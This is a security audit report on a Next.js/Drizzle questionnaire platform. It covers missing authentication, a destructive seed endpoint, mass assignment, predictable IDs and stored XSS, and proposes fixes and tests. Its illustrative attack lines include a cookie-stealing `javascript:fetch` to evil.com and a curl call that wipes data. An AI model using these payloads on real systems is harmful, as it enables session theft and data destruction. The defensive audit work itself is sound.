# Claude Code Review — Deep Audit

## A. PR Intent & Change Inventory

This is a full codebase review (no specific PR; no git history present). The application is a **multi-mode audit/questionnaire platform** ("Auditoría") built on Next.js 15 / React 19 / Drizzle ORM / Neon PostgreSQL. Its purpose is to let a consulting firm build and distribute questionnaires to clients, stores, or employees; collect and score responses; and generate reports.

**File inventory:**
- **Application code**: `src/app/api/**` (7 route files), `src/app/q/[testId]/page.tsx`, `src/app/q/[testId]/result/[responseId]/page.tsx`, `src/app/page.tsx`, `src/app/layout.tsx`
- **Components**: `src/components/admin-app.tsx`, `store.tsx`, `topbar.tsx`, `ui.tsx`, `client-quiz.tsx`, `result-view.tsx`, `src/components/pages/` (10 page components)
- **Lib**: `src/lib/db.ts`, `schema.ts`, `scoring.ts`, `modes.ts`, `seed-data.ts`
- **Config**: `package.json`, `next.config.ts`, `drizzle.config.ts`, `tsconfig.json`
- **Docs**: `SETUP.md`
- **Tests**: _(none)_
- **Migrations/IaC/CI**: _(none)_

Review depth: **full**, with deepest scrutiny on API routes, auth, data handling, and supply chain.

---

## B. Merge Recommendation

**BLOCK MERGE** — The API layer has zero authentication, a destructive unauthenticated data-wipe endpoint, mass-assignment vulnerabilities on two PATCH handlers, and predictable IDs used as access tokens; none of these are acceptable for a system that processes PII.

---

## C. Threat Model Summary

**Assets:** Respondent PII (name, email, company, role), quiz answers and scores, consultant notes (potentially confidential), questionnaire definitions (intellectual property), and the complete database.

**Entry points:**
- `POST /api/responses` — anonymous quiz submission from the public internet
- `GET /api/responses` — bulk read of all PII
- `PATCH /api/tests/[id]` — arbitrary field update on tests
- `PATCH /api/invitations/[id]` — arbitrary field update on invitations
- `POST /api/seed` — destructive data replacement
- `DELETE /api/tests/[id]`, `DELETE /api/responses/[id]`, `DELETE /api/invitations/[id]` — permanent deletion
- `GET /api/consultant-notes` — reads private consultant notes by company name
- Quiz result URL `/q/[testId]/result/[responseId]` — exposes full response including PII

**Trust boundaries crossed:**
- Anonymous internet user → all API routes (no boundary enforced)
- Any client → database CRUD operations without ownership checks

**Relevant actors:** Anonymous internet user, competitor, disgruntled invitee, automated scanner.

**Highest-impact paths:**
1. `POST /api/seed` → wipes all production data
2. `GET /api/responses` → extracts full PII dataset
3. `PATCH /api/tests/[id]` with arbitrary body → mass assignment / stored-XSS plant via `solutions[].link.url`
4. Prediction of `responseId` (Math.random-based) → read any respondent's result

---

## D. Findings

### Critical

---

**Finding C-1**

- **Severity:** Critical
- **Confidence:** Confirmed
- **Category:** Access control / Authentication (missing entirely)
- **CWE / OWASP:** CWE-862 (Missing Authorization), OWASP A01:2021
- **File / line:** All files under `src/app/api/`
- **Problem:** Every API route — including those that read PII, write data, and delete records — requires zero authentication. There is no session, token, API key, or any other access control. Any anonymous HTTP client on the internet can call every endpoint.
- **Impact & failure scenario:** A competitor, automated scanner, or malicious user hits `GET /api/responses` and downloads every respondent's name, email, company, role, and answers. They call `DELETE /api/tests/[id]` to destroy a test and all its responses. They call `PATCH /api/tests/[id]` to corrupt questionnaire data. All of this requires no credentials whatsoever.
- **Suggested fix:** Before launch, add an authentication layer (e.g., NextAuth.js / Clerk / a single hard-coded admin token stored in `process.env.ADMIN_TOKEN` checked via middleware). A minimal, low-friction approach: create `src/middleware.ts` that checks a cookie/Bearer token for all `/api/*` routes except the public quiz submission (`POST /api/responses`) and the public quiz pages (`/q/*`). Example:

```ts
// src/middleware.ts
import { NextRequest, NextResponse } from "next/server";
const PUBLIC_PATHS = ["/q/", "/api/responses"]; // POST only
export function middleware(req: NextRequest) {
  const isPublic = PUBLIC_PATHS.some(p => req.nextUrl.pathname.startsWith(p));
  if (!isPublic) {
    const token = req.cookies.get("admin_token")?.value;
    if (token !== process.env.ADMIN_TOKEN) {
      return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
    }
  }
  return NextResponse.next();
}
export const config = { matcher: ["/api/:path*"] };
```

- **Suggested test:** `curl -X DELETE https://your-app.vercel.app/api/tests/any-id` should return 401, not 200.

---

**Finding C-2**

- **Severity:** Critical
- **Confidence:** Confirmed
- **Category:** Access control / Data destruction
- **CWE / OWASP:** CWE-862, CWE-285 (Improper Authorization)
- **File / line:** `src/app/api/seed/route.ts:9`
- **Problem:** `POST /api/seed` is a fully unauthenticated endpoint that deletes **all** tests, responses, invitations, task actions, and consultant notes for a given mode, then replaces them with synthetic demo data. There is no auth check, no confirmation token, no rate limit.
- **Impact & failure scenario:** A single HTTP call: `curl -X POST https://your-app.vercel.app/api/seed -d '{"mode":"clientes"}'` destroys all production client data irreversibly. This is worse than a DROP TABLE because it silently succeeds and replaces real data with fakes, meaning the loss might not be noticed immediately.
- **Suggested fix:** (1) Add authentication (C-1 fix covers this). (2) Remove this endpoint entirely from production and keep it dev/staging only via an environment flag. (3) If it must exist, require an explicit `confirm: "DESTROY_ALL_DATA"` field in the body. Example guard:

```ts
if (process.env.NODE_ENV === "production") {
  return NextResponse.json({ error: "Seed disabled in production" }, { status: 403 });
}
```

- **Suggested test:** In production mode, `POST /api/seed` must return 403. In dev, it should require a token.

---

### High

---

**Finding H-1**

- **Severity:** High
- **Confidence:** Confirmed
- **Category:** Mass assignment / BOPLA (OWASP A01:2021)
- **CWE / OWASP:** CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes)
- **File / line:** `src/app/api/tests/[id]/route.ts:24-33`, `src/app/api/invitations/[id]/route.ts:13-22`
- **Problem:** Both PATCH handlers blindly forward all request body fields into the database `UPDATE` statement:

```ts
const patch: Record<string, unknown> = {};
for (const [k, v] of Object.entries(body)) {
  if (v !== undefined) patch[k] = v;
}
await db.update(tests).set(patch).where(eq(tests.id, id));
```

An attacker can set any column, including `id` (changing ownership IDs), `mode` (moving tests between modes), or any JSON blob column with arbitrary content. When combined with `solutions[].link.url`, an attacker can plant a `javascript:` URL that becomes stored XSS.

- **Impact & failure scenario:** Attacker sends `PATCH /api/tests/[id]` with body `{"solutions":[{"id":"s1","name":"x","description":"","category":"","link":{"label":"Click","url":"javascript:document.cookie"}}]}`. Every respondent who sees that result page gets an XSS payload in the CTA link.
- **Suggested fix:** Use an explicit allowlist of patchable fields:

```ts
const ALLOWED_TEST_FIELDS = ["name", "domain", "tags", "description", "status", "accent", "topics", "solutions", "branding"] as const;
const patch: Partial<typeof tests.$inferInsert> = {};
for (const key of ALLOWED_TEST_FIELDS) {
  if (body[key] !== undefined) patch[key as keyof typeof patch] = body[key];
}
```

Validate that `solutions[].link.url` starts with `https://` or `http://` before accepting.

- **Suggested test:** `PATCH /api/tests/[id]` with body `{"id":"new-id"}` should not change the record's primary key.

---

**Finding H-2**

- **Severity:** High
- **Confidence:** Confirmed
- **Category:** Cryptography / Predictable identifiers (CWE-338)
- **CWE / OWASP:** CWE-338 (Use of Cryptographically Weak PRNG), CWE-639 (Authorization Bypass Through User-Controlled Key)
- **File / line:** `src/lib/scoring.ts:133-135`
- **Problem:** All IDs — including `responseId` which gates access to a respondent's personal quiz result at `/q/[testId]/result/[responseId]` — are generated with `Math.random()`:

```ts
export function uid(prefix = "id"): string {
  return prefix + "_" + Math.random().toString(36).slice(2, 9);
}
```

`Math.random()` is not cryptographically secure, produces ~7 characters from a 36-char alphabet (≈36^7 ≈ 78 billion combinations, but the output space of Math.random is only 2^52), and is predictable if the PRNG state can be inferred. More practically: the result URL is shared or accessible, and IDs are short enough for targeted enumeration.

- **Impact & failure scenario:** Respondent A receives a quiz link. After submitting, they're taken to `/q/test_abc123/result/r_xyz789`. A motivated attacker who knows the testId (public) can enumerate 7-character base-36 values to find other respondents' result pages, exposing their name, email, company, role, and scores.
- **Suggested fix:** Use `crypto.randomUUID()` (available in Node.js 15+ and browsers) for all IDs:

```ts
export function uid(_prefix = "id"): string {
  return crypto.randomUUID();
}
```

Or use a scoped prefix: `prefix + "_" + crypto.randomUUID()`.

- **Suggested test:** Generate 1000 IDs and verify no collisions; verify result URLs are not accessible by guessing adjacent IDs.

---

**Finding H-3**

- **Severity:** High
- **Confidence:** Confirmed
- **Category:** Data exposure / PII
- **CWE / OWASP:** CWE-200 (Exposure of Sensitive Information), OWASP A02:2021, OWASP A09:2021
- **File / line:** `src/app/api/responses/route.ts:26-27`
- **Problem:** `GET /api/responses` (no query params) returns every response in the database with full PII: respondent name, email, company, role, all question answers. No authentication, no pagination, no field masking.
- **Impact & failure scenario:** `curl https://your-app.vercel.app/api/responses` returns a JSON array of every respondent's personal data ever collected. The array grows unboundedly with no pagination, so a large dataset also risks a DoS via memory exhaustion on the serverless function.
- **Suggested fix:** Add authentication (C-1). Add pagination: `LIMIT` + `OFFSET` or cursor-based. Consider masking email in list views (show only in detail views).
- **Suggested test:** Unauthenticated `GET /api/responses` must return 401.

---

**Finding H-4**

- **Severity:** High
- **Confidence:** Confirmed
- **Category:** XSS / Open URL injection
- **CWE / OWASP:** CWE-79 (Cross-site Scripting), CWE-601 (Open Redirect)
- **File / line:** `src/components/result-view.tsx:312-329`
- **Problem:** Solution link URLs are rendered directly into `href` attributes with no validation:

```tsx
<a href={sol.link.url} target="_blank" rel="noopener noreferrer" ...>
```

`sol.link.url` comes from the database, set by anyone with write access to the PATCH endpoint (currently: anyone). A `javascript:` URL here executes in the user's browser context when clicked.

- **Impact & failure scenario:** Admin (or attacker with access to the unauthenticated API) sets a solution link URL to `javascript:fetch('https://evil.com?c='+document.cookie)`. Every respondent who clicks the CTA button runs the attacker's script.
- **Suggested fix:** Validate URLs at the API layer before persisting. In the React component, add a safety check:

```tsx
const safeUrl = sol.link.url.startsWith("https://") || sol.link.url.startsWith("http://")
  ? sol.link.url : "#";
<a href={safeUrl} ...>
```

And in the PATCH handler, validate all `solutions[].link.url` values.

- **Suggested test:** Set a solution URL to `javascript:alert(1)`. Clicking the rendered CTA should not execute the script.

---

**Finding H-5**

- **Severity:** High
- **Confidence:** Confirmed
- **Category:** Missing tests
- **CWE / OWASP:** OWASP A09:2021 (Security Logging and Monitoring Failures)
- **File / line:** Project-wide — zero test files exist
- **Problem:** There are no tests of any kind: no unit tests, no integration tests, no security tests. Every security-sensitive path (auth would-be checks, scoring logic, data access) is entirely untested.
- **Impact & failure scenario:** Regressions in scoring logic go undetected. A fix for any finding in this review cannot be verified automatically. A broken authorization check could silently regress.
- **Suggested fix:** At minimum, add tests for: (a) scoring functions in `lib/scoring.ts` (pure functions, easy to unit test); (b) API routes using Next.js route handlers in a test environment; (c) negative security tests once auth is added (verify 401 on unauthenticated calls).
- **Suggested test:** `npm test` should exist and pass.

---

### Medium

---

**Finding M-1**

- **Severity:** Medium
- **Confidence:** Confirmed
- **Category:** Missing security headers
- **CWE / OWASP:** CWE-693 (Protection Mechanism Failure), OWASP A05:2021
- **File / line:** `next.config.ts:3`
- **Problem:** `next.config.ts` is empty. No `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security`, or `Referrer-Policy` headers are set.
- **Impact & failure scenario:** The app is frameable (clickjacking), allows mixed content, and lacks a CSP that would reduce XSS blast radius.
- **Suggested fix:**

```ts
const nextConfig: NextConfig = {
  async headers() {
    return [{
      source: "/(.*)",
      headers: [
        { key: "X-Frame-Options", value: "DENY" },
        { key: "X-Content-Type-Options", value: "nosniff" },
        { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
        { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=()" },
      ],
    }];
  },
};
```

Add a CSP once the inline style usage (extensive throughout the app) is addressed.

---

**Finding M-2**

- **Severity:** Medium
- **Confidence:** Confirmed
- **Category:** Client-supplied server-side data / Integrity
- **CWE / OWASP:** CWE-20 (Improper Input Validation)
- **File / line:** `src/app/api/responses/route.ts:44`
- **Problem:** `submittedAt` is accepted verbatim from the client:

```ts
submittedAt: submittedAt || new Date().toISOString(),
```

A client can submit any timestamp, including one in the future, past, or a non-ISO string, corrupting analytics (e.g., `lastDate` comparisons throughout the codebase use string comparison `>` on these values).

- **Impact & failure scenario:** A malicious respondent submits `submittedAt: "9999-01-01"` and their response always appears as the "latest" in every report, pushing legitimate responses below them.
- **Suggested fix:** Always generate `submittedAt` server-side; ignore client value:

```ts
submittedAt: new Date().toISOString(),
```

---

**Finding M-3**

- **Severity:** Medium
- **Confidence:** Confirmed
- **Category:** Input validation / Resource bounds
- **CWE / OWASP:** CWE-20, CWE-400 (Resource Exhaustion)
- **File / line:** `src/app/api/responses/route.ts:30-55`
- **Problem:** The response submission endpoint performs no validation:
- `testId` is not verified to correspond to an existing, published test
- `answers`, `respondent`, `company`, `email`, `role` have no length limits
- `answers` could be an arbitrarily large JSON object, not a `Record<string, string>` as expected
- No rate limiting prevents flooding the database with fake responses

- **Impact & failure scenario:** Automated tool submits 10,000 responses to a test, each with 1 MB `answers` payloads, exhausting database storage. Alternatively, submitting to a non-existent `testId` creates orphan responses that cannot be linked to a test.
- **Suggested fix:**

```ts
// Verify test exists and is published
const [test] = await db.select({ id: tests.id }).from(tests)
  .where(and(eq(tests.id, testId), eq(tests.status, "publicado")));
if (!test) return NextResponse.json({ error: "Test not found" }, { status: 404 });

// Validate field lengths
if (respondent && respondent.length > 200) return NextResponse.json({ error: "respondent too long" }, { status: 400 });
// ... similar for other string fields
```

---

**Finding M-4**

- **Severity:** Medium
- **Confidence:** Confirmed
- **Category:** Data integrity / Date comparison
- **CWE / OWASP:** CWE-20
- **File / line:** `src/components/pages/reporte-detail.tsx:41`, `src/components/pages/reportes.tsx:19-21`, `src/components/pages/responses.tsx:82-85`
- **Problem:** `lastDate` is computed via string comparison on ISO timestamps:

```ts
if (r.submittedAt && (!map[key].lastDate || r.submittedAt > map[key].lastDate))
```

ISO 8601 strings sort lexicographically correctly only if they are in the same timezone representation (all UTC with `Z` suffix). If any client submits a timestamp without `Z` (e.g., `2024-01-15T10:00:00` vs `2024-01-15T10:00:00.000Z`), the comparison produces wrong results.

- **Impact & failure scenario:** Reports show wrong "last evaluation" dates.
- **Suggested fix:** Store dates as proper PostgreSQL `TIMESTAMP` columns (or normalize all client timestamps to UTC ISO format server-side before storing). Use `timestamp` drizzle type with `.defaultNow()` rather than `text` for `submittedAt` in `responses` and `sentAt` in `invitations`.

---

**Finding M-5**

- **Severity:** Medium
- **Confidence:** Confirmed
- **Category:** Error handling / Silent failure
- **CWE / OWASP:** CWE-390 (Detection of Error Condition Without Action)
- **File / line:** `src/components/client-quiz.tsx:95-98`
- **Problem:**

```ts
} catch {
  // On error, still show result (optimistically)
  setStage("result");
}
```

When the response submission fails (network error, server error), the user is silently shown the result screen with no indication of failure. The response is not persisted, `responseId` is null, and the "permanent" result URL cannot be shared or retrieved later.

- **Impact & failure scenario:** Respondent completes a 30-minute evaluation. Network hiccup during submission. The user sees "results" but nothing was saved. The client has no record of the evaluation.
- **Suggested fix:** Show an error state on submission failure with a retry button instead of silently showing results:

```ts
} catch {
  setStage("error"); // Add "error" as a Stage type
}
```

---

**Finding M-6**

- **Severity:** Medium
- **Confidence:** Confirmed
- **Category:** Supply chain
- **CWE / OWASP:** OWASP A08:2021
- **File / line:** `package.json:17`
- **Problem:** The `xlsx` package at version `^0.18.5` (SheetJS Community Edition) is the npm distribution of SheetJS which was deprecated on npm in favor of a paid/licensed version. The npm-hosted package has not received security updates since 2022 and had its maintenance model changed in a way that creates supply chain uncertainty.
- **Impact & failure scenario:** A vulnerability in the XLSX parsing/generation library could be exploited if the library is used with untrusted input. Currently it's used for export only (with internal data), limiting the attack surface, but the lack of updates is a risk.
- **Suggested fix:** Evaluate replacing with `exceljs` (MIT, actively maintained) or using the official SheetJS Pro license if the dependency is essential. Alternatively, generate CSV exports instead of XLSX for the export use case.

---

**Finding M-7**

- **Severity:** Medium
- **Confidence:** Confirmed
- **Category:** Access control / Lack of authorization on consultant notes
- **CWE / OWASP:** CWE-862
- **File / line:** `src/app/api/consultant-notes/route.ts`
- **Problem:** `GET /api/consultant-notes?company=X&mode=Y` returns private consultant notes for any company without any authentication. These notes are explicitly described as "private consultant notes" in the UI placeholder text ("Escribe notas privadas del consultor para este cliente").
- **Impact & failure scenario:** A respondent or competitor queries `GET /api/consultant-notes?company=Acme+Corp&mode=clientes` and reads private internal assessments written by the consultant about that company.
- **Suggested fix:** Auth middleware (C-1) covers this. Additionally consider encrypting consultant notes at rest or treating them as sensitive fields.

---

**Finding M-8**

- **Severity:** Medium
- **Confidence:** Confirmed
- **Category:** Reliability / N+1 query pattern
- **CWE / OWASP:** CWE-400
- **File / line:** `src/app/api/tests/route.ts:18`
- **Problem:** `GET /api/tests` fetches all responses from the database regardless of how many tests are returned:

```ts
const allResponses = await db.select().from(responses);
```

This is an unbounded full-table scan on the `responses` table that happens on every dashboard load. As responses accumulate, this query becomes progressively slower and more expensive, and will eventually time out on the serverless function.

- **Impact & failure scenario:** With 50,000+ responses, the admin dashboard becomes unusable. The query loads all response data into memory for in-process aggregation.
- **Suggested fix:** Use a SQL aggregate query to compute stats directly:

```ts
const stats = await db
  .select({
    testId: responses.testId,
    count: sql<number>`count(*)`,
  })
  .from(responses)
  .where(inArray(responses.testId, testIds))
  .groupBy(responses.testId);
```

The average score computation is trickier — consider persisting a computed `score` column on `responses` at insert time.

---

### Low / Nits

---

**Finding L-1**

- **Severity:** Low
- **Confidence:** Confirmed
- **Category:** Maintainability
- **File / line:** `src/app/api/tests/route.ts:72-117`
- **Problem:** `computeOverall` is duplicated from `src/lib/scoring.ts:computeResult`. The comment "avoids circular import issues" suggests this was a workaround. Extract a shared `computeOverallScore(topics, answers)` utility that both files can use.

---

**Finding L-2**

- **Severity:** Low
- **Confidence:** Confirmed
- **Category:** Correctness
- **File / line:** `src/lib/scoring.ts:42-47`
- **Problem:** The `condMet` function's `"below"` operator uses `<=` (less-than-or-equal):

```ts
if (cond.operator === "below") return grade <= cond.threshold;
```

But the UI label says "≤ (por debajo)" which matches. However the label for `"above"` also uses `>=`. Both boundaries are inclusive, meaning a score exactly at the threshold triggers **both** a "below" and an "above" condition simultaneously. This creates ambiguous solution triggering at boundary scores. Clarify the intended semantics and document it.

---

**Finding L-3**

- **Severity:** Low
- **Confidence:** Confirmed
- **Category:** Data / Missing FK constraint
- **File / line:** `src/lib/schema.ts:40-47`
- **Problem:** `taskActions.testId` has no foreign key reference to `tests.id` (unlike `responses.testId` and `invitations.testId` which both have `references(() => tests.id, { onDelete: "cascade" })`). If a test is deleted, its task actions become orphaned rows.
- **Suggested fix:**

```ts
testId: text("test_id").notNull().references(() => tests.id, { onDelete: "cascade" }),
```

---

**Finding L-4**

- **Severity:** Low
- **Confidence:** Confirmed
- **Category:** Reliability
- **File / line:** `src/components/pages/builder.tsx:916-920`
- **Problem:** The effect that syncs from the store runs on every `storeTest` change but suppresses sync when `saveTimer.current` is set. After a save completes, `saveTimer.current` is cleared but the store may have already refreshed. The `useEffect` won't fire again unless `storeTest` changes. This is a stale-sync gap rather than a hard bug, but could cause the builder to show slightly stale data after save.

---

**Finding L-5**

- **Severity:** Low
- **Confidence:** Confirmed
- **Category:** UX / Correctness
- **File / line:** `src/components/pages/builder.tsx:671`
- **Problem:** The `InvStatusBadge` in `builder.tsx` maps `"completado"` and `"enviado"` to CSS classes, but the database stores `"completada"` (feminine form) and `"enviada"`. The badge will always fall through to the default `""` class and show raw status strings. Similarly in `responses.tsx` line 431, the map uses `"completado"/"enviado"` but the API inserts `"completada"/"enviada"`.

---

## E. Reliability & Performance Notes

- **Full table scan on dashboard load** (see M-8): `GET /api/tests` pulls all responses every time regardless of test filter.
- **No timeouts on database queries**: Neon HTTP driver has no explicit query timeout configured. A slow query blocks the serverless function until the platform's 300s timeout. Consider wrapping critical queries in `Promise.race` with a timeout.
- **No pagination anywhere**: `GET /api/responses`, `GET /api/tests`, `GET /api/task-actions` all return unbounded result sets.
- **Scoring recomputed client-side on every render**: `computeResult` is called inside `useMemo` hooks throughout the app. This is fine at small scale but becomes a bottleneck at hundreds of responses.
- **`xlsx` library imported in client bundle**: `src/components/pages/tablero.tsx` imports `xlsx` which adds ~1 MB to the client bundle. Consider lazy importing it only when export is triggered.
- **No observability**: No structured logging, no error tracking (Sentry etc.), no performance monitoring. Failures in production will be invisible.
- **Db singleton pattern is correct** for serverless: The lazy `getDb()` singleton in `db.ts` is appropriate for the Neon HTTP driver which doesn't hold persistent connections.

---

## F. Data & Migration Safety

No schema migrations are present in this codebase (Drizzle uses `db:push` which applies changes directly). Key observations:

- `createdAt` in `tests` is `text` type with default `""` — not a real timestamp. `submittedAt` in `responses` and `sentAt` in `invitations` are also `text`. This should be `timestamp` for correct sorting, aggregation, and query filtering.
- `taskActions.testId` lacks a FK cascade (L-3 above).
- If the schema is ever migrated to use `timestamp` columns, existing string values will need a backfill migration.
- No rollback strategy exists for `db:push` changes — schema changes are immediately applied to production.

---

## G. Supply Chain & Configuration Review

| Dependency | Version | Status |
|---|---|---|
| `next` | ^15.3.3 | ✅ Current stable |
| `react` / `react-dom` | ^19.0.0 | ✅ Current stable |
| `@neondatabase/serverless` | ^0.10.4 | ✅ Actively maintained |
| `drizzle-orm` | ^0.44.0 | ✅ Actively maintained |
| `drizzle-kit` | ^0.31.0 | ✅ Actively maintained |
| **`xlsx`** | ^0.18.5 | ⚠️ Deprecated on npm; no updates since 2022 — see M-6 |
| `clsx` | ^2.1.1 | ✅ Fine |
| `tailwindcss` | ^4 | ✅ Current |

No CI/CD workflows, no IaC files, no Docker configuration present.

**No `CLAUDE.md` or `CONTRIBUTING.md`** — no documented conventions to evaluate changes against.

---

## H. Test Coverage Assessment

**There are zero tests in this project.** No test runner is configured in `package.json`. There are no `*.test.ts`, `*.spec.ts`, or `__tests__/` files.

**Minimum tests that must be added before considering production-ready:**

1. `scoring.ts` — unit tests for `computeResult`, `condMet`, `scoreBucket`, `uid` (verify UUID format after fix)
2. API routes — integration tests with a test database verifying:
   - Authenticated requests succeed; unauthenticated return 401
   - PATCH does not allow mass assignment of disallowed fields
   - POST /api/responses validates that testId exists and is published
   - POST /api/seed returns 403 in production
3. Security regression tests:
   - Verify `javascript:` URLs in solution links are rejected
   - Verify cross-response IDOR: fetching `/q/[testId]/result/[wrongResponseId]` returns 404

---

## I. Security Review Coverage

| Area | Status |
|---|---|
| 4a. Access control & authorization | Reviewed — **Critical findings** (C-1, C-2, H-1, M-7) |
| 4b. Authentication & session management | Reviewed — **Critical** (no auth exists) |
| 4c. Injection & untrusted input | Reviewed — No SQL injection (parameterized via Drizzle); **M-3** (unvalidated inputs) |
| 4d. Cross-site scripting & frontend | Reviewed — **H-4** (javascript: URL in href), **M-1** (no security headers) |
| 4e. Cryptography & secrets | Reviewed — **H-2** (Math.random for IDs); no secrets in code ✅ |
| 4f. Data exposure, privacy & logging | Reviewed — **H-3** (unauthenticated PII export), **M-7** (consultant notes) |
| 4g. Dependencies & supply chain | Reviewed — **M-6** (xlsx) |
| 4h. Configuration, CI/CD & IaC | Reviewed — **M-1** (missing headers); no CI/CD present |
| 4i. AI/LLM features | Not applicable — no AI/LLM integration |

---

## J. Questions for the Author

1. **Is this app intended to be multi-tenant or single-tenant?** The current data model has no `userId` or `tenantId` anywhere — it appears to be a single-tenant app for one consulting team. If so, a simple admin token secret is sufficient for auth. If multi-tenant, the entire data model needs tenant isolation columns.

2. **Is `POST /api/responses` intended to be publicly accessible (no auth)?** The quiz public pages `/q/[testId]` are public, and submission must work for unauthenticated respondents. This endpoint should stay public, but its inputs need validation (M-3) and rate limiting.

3. **What is the expected data retention policy for PII (respondent names/emails)?** There's no mechanism to delete a specific respondent's data (only delete an entire response record). GDPR/privacy compliance may require a right-to-erasure flow.

---

## K. Out-of-Scope Observations

These are pre-existing issues not introduced by any specific change, noted for follow-up:

- **No `robots.txt`**: Admin pages at `/` are indexable by search engines. A `robots.txt` preventing indexing of the admin path would be prudent once auth is added.
- **`drizzle.config.ts`** does not restrict schema pushes to specific environments — a `db:push` run locally against `DATABASE_URL` in `.env.local` could accidentally modify production if the env is misconfigured.
- **The `invitations` table does not send actual emails** — the app creates invitation records but there is no email-sending integration. The "invite by email" feature is a UI affordance with no actual delivery mechanism. This should either be implemented or the feature removed to avoid user confusion.
- **`test.status` is a free-text field** with no constraint — anything other than `"publicado"` is treated as draft, but invalid values (typos, etc.) will silently behave as drafts.
- **`src/lib/seed-data.ts` contains realistic-looking but synthetic PII** (names, emails, companies). While this is demo data, it should be clearly marked and audited to ensure no real person's data was accidentally included.
